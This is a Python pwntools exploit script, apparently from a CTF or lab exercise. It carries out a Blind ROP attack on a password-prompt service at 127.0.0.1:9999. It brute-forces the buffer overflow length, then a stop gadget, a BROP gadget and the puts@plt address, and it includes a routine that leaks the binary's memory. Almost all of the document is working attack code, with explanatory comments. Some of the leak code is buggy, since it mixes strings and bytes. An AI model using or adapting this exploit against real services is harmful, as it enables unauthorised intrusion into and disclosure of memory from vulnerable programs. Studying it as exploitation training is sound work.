from pwn import *
from LibcSearcher import *

def getbuffer_len():
  i=1
  while 1:
    try:
      io = remote('127.0.0.1',9999)
      io.recvuntil(b'WelCome my friend,Do you know password?\n')
      io.send(i*b'a')
      output = io.recv()
      # print(output)
      io.close()
      if not output.startswith(b'No password'):
        return i-1
      else:
        i+=1
        pass
    except EOFError:
        io.close()
        return i-1


def get_stop_addr(length):
  addr = 0x4006b0  # No PIE
  while 1 :
    try : 
      io = remote('127.0.0.1', 9999)
      io.recvuntil(b'WelCome my friend,Do you know password?\n')
      payload = b'a'*length + p64(addr)
      print('Temporary address is 0x%x'%(addr))
      io.sendline(payload)
      content = io.recv()  # if recv() doesn't cause crash, it means that it is a stop gadgets
      io.close()  # sometimes _start will not cause crash
      print('One success addr: 0x%x' % (addr))
      print('When the addr is found successfully, you will recieve the message from the remote: ',content)
      return addr
    except Exception:
      addr += 1
      io.close()
      

def get_brop_gadget(length, stop_addr, addr):
    print("Parameters: \nstop gadget->",hex(stop_addr),',brop gadget->',hex(addr))
    try:
        io = remote('127.0.0.1',9999)
        io.recvuntil(b'WelCome my friend,Do you know password?\n')
        payload = b'a'*length + p64(addr) + p64(0)*6 + p64(stop_addr) + p64(0)*10
        io.sendline(payload)
        content = io.recv()
        io.close()
        print(content)
        # stop gadget returns memory
        # remember the type of param of startswith() is bytes, not strings,so you need start it with 'b + str'
        if not content.startswith(b'WelCome'):
            return False
        
        return True
    except:
        io.close()
        return False


def check_brop_gadget(length, addr):
  """ Just for checking brop possible gadget """
  try:
    io = remote('127.0.0.1',9999)
    io.recvuntil(b'WelCome my friend,Do you know password?\n')
    payload = b'a'*length + p64(addr) + b'a'*8*10
    io.sendline(payload)
    io.close()
    return False
  except:
    io.close()
    return True
  

def brop_gadget(length, stop_gadget, init_addr):
    """ Get the brop gadget """
    addr = init_addr
    while 1:
        res = get_brop_gadget(length, stop_gadget, addr)
        print(hex(addr),': ',res)
        if res:
            print('possible brop gadget: 0x%x' % (addr))
            if check_brop_gadget(length, addr):
                print('success brop gadget: 0x%x' % (addr))
            break
        addr += 1
    return addr


def get_puts_addr(length, rdi_ret, stop_gadget):
    addr = 0x400500  # To save time,finally find that the addr of addr is 0x400555
    while True:
        print("")
        print(hex(addr))
        io = remote('127.0.0.1', 9999)
        io.recvuntil(b'password?\n')
        # If the addr points to puts@plt, it means that after jumping to addr, the machine will execute puts and 
        # print out the contents pointing to 0x400000,which is the beginning of the ELF with header of '\x7fELF'.
        payload = b'A'*length + p64(rdi_ret) + p64(0x400000) + p64(addr) + p64(stop_gadget)
        io.sendline(payload)
        try:
            content = io.recv()
            print(content)
            res1 = content.startswith(b'\x7fELF')
            # res2 = content.contains(b'WelCome')       
            if res1:  # remenber add 'b' to your string
                print('Find puts@plt addr: 0x%x' % (addr))
                return addr
            io.close()
            addr += 16  # because the plt addr are often starting with zero at lowest-bit(divide by 16)
        except Exception:
            io.close()
            addr += 16


def leak_unit(length, rdi_ret, puts_plt, leak_addr, stop_gadget):
  io = remote('127.0.0.1',9999)
  payload = b'a'*length + p64(rdi_ret) + p64(leak_addr) + p64(puts_plt) + p64(stop_gadget)
  io.recvuntil(b'password?\n')
  io.sendline(payload)
  try:
    data = io.recv()
    io.close()
    try:
      data = data[:data.index(b'\nWelCome')]
    except Exception:
      data = data
    if data == "":
      data = '\x00'
    return data
  except Exception:
    io.close()
    return None
  
def leak_memory(length, stop_gadget, brop_gadget, rdi_ret, puts_plt, init_addr):
  result = ""
  addr = init_addr
  while addr < 0x401000:
    print('\n', hex(addr))
    data = leak_unit(length, rdi_ret, puts_plt, addr, stop_gadget)
    if data is None:
      continue
    else:
      result += str(data)
    addr += len(data)  # functions like iterator
  """ Restore the memory leaked from the exploit script """
  with open('code', 'wb') as f:
    f.write(result)


if __name__ == "__main__":
    buffer_len = getbuffer_len()
    print("The length of buffer overflow is: ",buffer_len)
    
    stop_addr = get_stop_addr(buffer_len)  # find the stop gadgets
    print("The stop gadget address is: ",hex(stop_addr))
    
    init_addr = 0x4007b0  # To save time, sometimes you need to try some values slightly bigger than 0x400000
    brop_addr = brop_gadget(buffer_len, stop_addr, init_addr)
    print('The address of brop gadget is 0x%x' % (brop_addr))

    rdi_ret = brop_addr + 0x9
    puts_plt_addr = get_puts_addr(buffer_len, rdi_ret, stop_addr)
    print('The address of puts@plt is 0x%x' % (puts_plt_addr)) # get the addr of puts@plt is 0x400555

    print(buffer_len,' ',hex(stop_addr),' ',hex(brop_addr),' ',hex(rdi_ret), ' ',hex(puts_plt_addr))

    # leak_memory(buffer_len, stop_addr, brop_addr, rdi_ret, puts_plt_addr, 0x400000)

